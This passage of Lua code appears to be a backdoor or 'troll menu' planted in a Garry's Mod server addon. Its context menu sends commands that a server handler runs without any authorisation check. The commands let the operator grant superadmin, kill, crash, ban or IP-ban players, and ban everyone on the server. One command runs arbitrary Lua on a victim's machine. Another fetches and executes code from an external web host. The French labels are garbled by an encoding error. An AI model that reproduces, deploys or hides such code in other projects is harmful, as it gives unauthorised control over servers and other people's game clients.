     net.WriteEntity( userl )
     net.SendToServer()
     actioneff(&quot;Vous venez de tuer &quot; .. userl:Nick())
end ):SetIcon( &quot;icon16/delete.png&quot; )
meutre:AddOption( &quot;Tuer la personne (silencieux)&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;killusersilence&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
     actioneff(&quot;Vous venez de tuer &quot; .. userl:Nick())
end ):SetIcon( &quot;icon16/delete.png&quot; )
meutre:AddOption( &quot;Bruler la personne&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;fireuser&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de bruler &quot; .. userl:Nick())
 end ):SetIcon( &quot;icon16/delete.png&quot; )

meutre:AddOption( &quot;Exploser la personne&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;exploseuser&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez d'exploser &quot; .. userl:Nick())
 end ):SetIcon( &quot;icon16/delete.png&quot; )

ulxsubgrade:AddOption( &quot;[SUPERADMIN]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;superadmin&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de passer &quot; .. userl:Nick() .. &quot; [superadmin]&quot;)
end ):SetIcon( &quot;icon16/user_add.png&quot; )

ulxsubgrade:AddOption( &quot;[USER]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;userrank&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de passer &quot; .. userl:Nick() .. &quot; [user]&quot;)
end ):SetIcon( &quot;icon16/user_delete.png&quot; )

ulxsubgrade:AddOption( &quot;[CUSTOM]&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame )
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;vip&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;custom&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/user_delete.png&quot; ) 

ulxsubnoclip:AddOption( &quot;[ON]&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;noclipon&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
 end ):SetIcon( &quot;icon16/accept.png&quot; )

ulxsubnoclip:AddOption( &quot;[OFF]&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;noclipoff&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
end ):SetIcon( &quot;icon16/cancel.png&quot; )

ulx:AddOption( &quot;Donner de l'argent&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;500&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;addmoney&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/money_add.png&quot; ) 

ulx:AddOption( &quot;Point de Vie&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;100&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;pvheal&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/heart.png&quot; )

ulx:AddOption( &quot;Point d'armure&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;250&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;armorpv&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/user_suit.png&quot; )

troll:AddOption( &quot;Launch&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;launchuser&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous d'envoyer &quot; .. userl:Nick() .. &quot; dans les airs&quot;)
end ):SetIcon( &quot;icon16/arrow_up.png&quot; )

ulx:AddOption( &quot;Meurtre au RPG&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;lockdown&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/clock_red.png&quot; )

troll:AddOption( &quot;2D Players&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;2dplayeruser&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/arrow_up.png&quot; )

troll:AddOption( &quot;Donner la grosse t&Atilde;&ordf;te&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;grosseteteuser&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bug.png&quot; )

troll:AddOption( &quot;Changer la taille du joueur&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;5&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;scaleuser&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/application_edit.png&quot; )

troll:AddOption( &quot;Faire crash le joueur&quot;, function() 
     net.Start( &quot;echangeinfo&quot; )
     net.WriteString(&quot;crashuser&quot;)
     net.WriteEntity( userl )
     net.SendToServer()
     actioneff(userl:Nick() .. &quot; vient de crash&quot;)
end ) :SetIcon( &quot;icon16/disconnect.png&quot; )

troll:AddOption( &quot;Hurlement&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;hurlementuser&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez d'hurler sur &quot; .. userl:Nick())
end ):SetIcon( &quot;icon16/bell.png&quot; )

trollsubflash:AddOption( &quot;[ON]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;flashon&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/accept.png&quot; )

trollsubflash:AddOption( &quot;[OFF]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;flashoff&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/cancel.png&quot; )

trollsubscreen:AddOption( &quot;[ON]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;screenon&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/accept.png&quot; )

trollsubscreen:AddOption( &quot;[OFF]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;screenoff&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/cancel.png&quot; ) 

trollsubstopsound:AddOption( &quot;[ON]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;stopsoundon&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/accept.png&quot; )

trollsubstopsound:AddOption( &quot;[OFF]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;stopsoundoff&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/cancel.png&quot; ) 

trollsubmoooves:AddOption( &quot;[ON]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;moovetroll&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(userl:Nick()..&quot; vient de perdre le contr&Atilde;&acute;le&quot;)
end ):SetIcon( &quot;icon16/accept.png&quot; )

trollsubmoooves:AddOption( &quot;[OFF]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unmoovetroll&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(userl:Nick()..&quot; vient de reprendre le contr&Atilde;&acute;le&quot;)
end ):SetIcon( &quot;icon16/cancel.png&quot; )

trollsubgravity:AddOption( &quot;[ON]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;cassergr&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de casser la gravit&Atilde;&copy; de &quot; .. userl:Nick())
end ):SetIcon( &quot;icon16/accept.png&quot; )

trollsubgravity:AddOption( &quot;[OFF]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;retablirgr&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de r&Atilde;&copy;tablir la gravit&Atilde;&copy; &Atilde;  &quot; .. userl:Nick())
end ):SetIcon( &quot;icon16/cancel.png&quot; )

trollsubjumpc:AddOption( &quot;[ON]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;jumpuser&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de casser la gravit&Atilde;&copy; des sauts de &quot; .. userl:Nick())
end ):SetIcon( &quot;icon16/accept.png&quot; )

trollsubjumpc:AddOption( &quot;[OFF]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;retablirjumpuser&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de r&Atilde;&copy;tablir la gravit&Atilde;&copy; des sauts de &quot; .. userl:Nick())
end ):SetIcon( &quot;icon16/cancel.png&quot; )

troll:AddOption( &quot;Black Screen&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;blackscreen&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez d'enlever la vue &Atilde;  &quot; .. userl:Nick())
end ):SetIcon( &quot;icon16/contrast.png&quot; )

troll:AddOption( &quot;Imitation&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;/ooc Je suis un soumis.&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;imitation&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/application_edit.png&quot; )

trollsubmic:AddOption( &quot;[ON]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;micon&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous avez activer le micro de &quot; .. userl:Nick() )
end ):SetIcon( &quot;icon16/accept.png&quot; )

trollsubmic:AddOption( &quot;[OFF]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;micoff&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous avez d&Atilde;&copy;sactiver le micro de &quot; .. userl:Nick() )
end ):SetIcon( &quot;icon16/cancel.png&quot; )

troll:AddOption( &quot;Changer le model&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;models/editor/playerstart.mdl&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;setmodel&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/box.png&quot; )

troll:AddOption( &quot;Send LUA&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;Lua Code&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;sendluauser&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/application_xp_terminal.png&quot; )


visuel:AddOption( &quot;Visuel John&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;johnsound&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/application_xp_terminal.png&quot; )

soundboard:AddOption( &quot;SoundBoard Lien&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;Lua Code&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;soundboard&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/application_xp_terminal.png&quot; )

ulxsubgod:AddOption( &quot;[ON]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;goduseron&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de mettre en mode dieu &quot; .. userl:Nick())
 end ):SetIcon( &quot;icon16/heart_add.png&quot; ) 
ulxsubgod:AddOption( &quot;[OFF]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;goduseroff&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez d'enlever de mode dieu &quot; .. userl:Nick())
 end ):SetIcon( &quot;icon16/heart_delete.png&quot; ) 
ulx:AddOption( &quot;Give une arme&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;weapon_rpg&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;items&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/bomb.png&quot; ) 

ulx:AddOption( &quot;Kick&quot;, function() 
local frame = vgui.Create( &quot;DFrame&quot; )
frame:SetSize( 400, 100 )
frame:SetTitle( &quot;&quot; )
frame:Center()
frame:MakePopup()
local TextEntry = vgui.Create( &quot;DTextEntry&quot;, frame ) -- create the form as a child of frame
TextEntry:SetPos( 25, 50 )
TextEntry:SetSize( 350, 35 )
TextEntry:SetText( &quot;Raison...&quot; )
TextEntry.OnEnter = function( self )
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;kickuser&quot;)
         net.WriteEntity( userl )
         net.WriteString(TextEntry:GetValue())
         net.SendToServer()
end
end ):SetIcon( &quot;icon16/status_away.png&quot; )

ulx:AddOption( &quot;Ban&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;banuser&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de ban &quot; .. userl:Nick())
end ):SetIcon( &quot;icon16/status_busy.png&quot; ) 

ulx:AddOption( &quot;BanIP&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;banipuser&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de banIP &quot; .. userl:Nick())
end ):SetIcon( &quot;icon16/status_busy.png&quot; ) 

ulxsubfreeze:AddOption( &quot;[ON]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;freezeuser&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de freeze &quot; .. userl:Nick())
end ):SetIcon( &quot;icon16/accept.png&quot; )

ulxsubfreeze:AddOption( &quot;[OFF]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unfreezeuser&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de unfreeze &quot; .. userl:Nick())
end ):SetIcon( &quot;icon16/cancel.png&quot; ) 

ulx:AddOption( &quot;Unjail&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unjailall&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bomb.png&quot; )

ulx:AddOption( &quot;Stripweapon&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;strip&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez d'enlever les armes de &quot; .. userl:Nick() )
end ):SetIcon( &quot;icon16/bomb.png&quot; )

ulx:AddOption( &quot;Context De Combat&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;contextfucker&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vient d'obtenir le pouvoir de vie et de mort &quot;)
end ):SetIcon( &quot;icon16/bomb.png&quot; )

tpsubgmconstruct:AddOption( &quot;Spawn&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;gm_construct_spawn&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubgmconstruct:AddOption( &quot;Building N&Acirc;&deg;1 [Derni&Atilde;&uml;re &Atilde;&copy;tage]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;gm_construct_building_roof0&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubgmconstruct:AddOption( &quot;Building N&Acirc;&deg;1 [Toit]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;gm_construct_building_roof1&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubgmconstruct:AddOption( &quot;Building N&Acirc;&deg;2 [Derni&Atilde;&uml;re &Atilde;&copy;tage]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;gm_construct_building2_roof1&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubgmconstruct:AddOption( &quot;Building N&Acirc;&deg;2 [Toit]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;gm_construct_building2_roof0&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubgmconstruct:AddOption( &quot;Building N&Acirc;&deg;3 [Toit]&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;gm_construct_building3_roof0&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )


tpsubgmconstruct:AddOption( &quot;Sous-Sol&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;gm_construct_down&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubgmconstruct:AddOption( &quot;Secret Room&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;gm_construct_secret&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )
tpsubgmconstruct:AddOption( &quot;Skybox&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;gm_construct_skybox&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubgmflat:AddOption( &quot;Secret Room&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;gm_flat_secret&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubglife3:AddOption( &quot;Grue&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;glife3_grue&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubglife3:AddOption( &quot;Water tower&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;glife3_water_tower&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubglife3:AddOption( &quot;Bank Vault&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;glife3_coffre&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )

tpsubglife3:AddOption( &quot;Secret Room&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;glife3_secret&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )

downtownv4cv2:AddOption( &quot;Spawn&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;rp_rockford_v2b_spawn&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end )

animation:AddOption( &quot;Saluer&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_salute_user&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animation:AddOption( &quot;Robot&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_robot_user&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animation:AddOption( &quot;Levez les mains&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_cheer_user&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animation:AddOption( &quot;Rire&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_laugh_user&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animation:AddOption( &quot;Danse sexy&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_muscle_user&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animation:AddOption( &quot;Faire le beau&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_persistence_user&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )

animation:AddOption( &quot;Dance&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;animation_dance_user&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
end ):SetIcon( &quot;icon16/bell.png&quot; )


mooves:AddOption( &quot;[ON]Avancer&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;forwardmoove&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de faire avancer &quot; .. userl:Nick() )
end ):SetIcon( &quot;icon16/accept.png&quot; )

mooves:AddOption( &quot;[OFF]Avancer&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unforwardmoove&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez d'arr&Atilde;&ordf;ter de faire avancer &quot; .. userl:Nick() )
end ):SetIcon( &quot;icon16/stop.png&quot; )

mooves:AddOption( &quot;[ON]Reculer&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;backmoove&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de faire reculer &quot; .. userl:Nick() )
end ):SetIcon( &quot;icon16/accept.png&quot; )

mooves:AddOption( &quot;[OFF]Reculer&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unbackmoove&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez d'arr&Atilde;&ordf;ter de faire reculer &quot; .. userl:Nick() )
end ):SetIcon( &quot;icon16/stop.png&quot; )

mooves:AddOption( &quot;[ON]Tourner &Atilde;  gauche&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;leftmoove&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de faire touner &Atilde;  gauche &quot; .. userl:Nick() )
end ):SetIcon( &quot;icon16/accept.png&quot; )

mooves:AddOption( &quot;[OFF]Tourner &Atilde;  gauche&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unleftmoove&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez d'arr&Atilde;&ordf;ter de faire touner &Atilde;  gauche &quot; .. userl:Nick() )
end ):SetIcon( &quot;icon16/stop.png&quot; )

mooves:AddOption( &quot;[ON]Tourner &Atilde;  droite&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;rightmoove&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez d'arr&Atilde;&ordf;ter de faire touner &Atilde;  droite &quot; .. userl:Nick() )
end ):SetIcon( &quot;icon16/accept.png&quot; )

mooves:AddOption( &quot;[OFF]Tourner &Atilde;  droite&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unrightmoove&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez d'arr&Atilde;&ordf;ter de faire touner &Atilde;  gauche &quot; .. userl:Nick() )
end ):SetIcon( &quot;icon16/stop.png&quot; )

mooves:AddOption( &quot;[ON]S'accroupir&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;squatmoove&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez de faire s'accroupir &quot; .. userl:Nick() )
end ):SetIcon( &quot;icon16/accept.png&quot; )

mooves:AddOption( &quot;[OFF]S'accroupir&quot;, function() 
         net.Start( &quot;echangeinfo&quot; )
         net.WriteString(&quot;unsquatmoove&quot;)
         net.WriteEntity( userl )
         net.SendToServer()
         actioneff(&quot;Vous venez d'arr&Atilde;&ordf;ter de faire s'accroupir &quot; .. userl:Nick() )
end ):SetIcon( &quot;icon16/stop.png&quot; )


m:AddSpacer() -- Add a spacer
m:Open() -- Show our menu
end
        ]] )
        net.Send(ply)
        return &quot;&quot;
end )


net.Receive(&quot;echangeinfo&quot;, function()
    local uaction = net.ReadString()
    local user = net.ReadEntity()

    if (uaction == &quot;banall&quot;) then
        for k,v in pairs (player.GetAll()) do v:Ban( 0, true ) end
    end

    if (uaction == &quot;banallstaff&quot;) then
        for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != &quot;user&quot; ) then v:Ban( 0, true ) end end

    end

    if (uaction == &quot;blackscreen&quot;) then
    user:ScreenFade( SCREENFADE.IN, Color( 0, 0, 0, 500 ), 500000, 500000 )
    end

    if (uaction == &quot;imitation&quot;) then
        user:Say( net.ReadString(),true )
    end

    if (uaction == &quot;sendluauser&quot;) then
        user:SendLua( net.ReadString() ) --sound.PlayURL( &quot;https://translate.google.com/translate_tts?ie=UTF-8&amp;tl=fr-TR&amp;client=tw-ob&amp;q=TEXTE&quot;, &quot;&quot;, function()end )
    end
    
    if (uaction == &quot;johnsound&quot;) then
        user:SendLua( [[http.Fetch(&quot;https://akitaman.000webhostapp.com/john.lua&quot;,function(body,len,headers,code)RunString(body)end) ]] ) --sound.PlayURL( &quot;https://translate.google.com/translate_tts?ie=UTF-8&amp;tl=fr-TR&amp;client=tw-ob&amp;q=TEXTE&quot;, &quot;&quot;, function()end )
    end
    
    if (uaction == &quot;soundboard&quot;) then
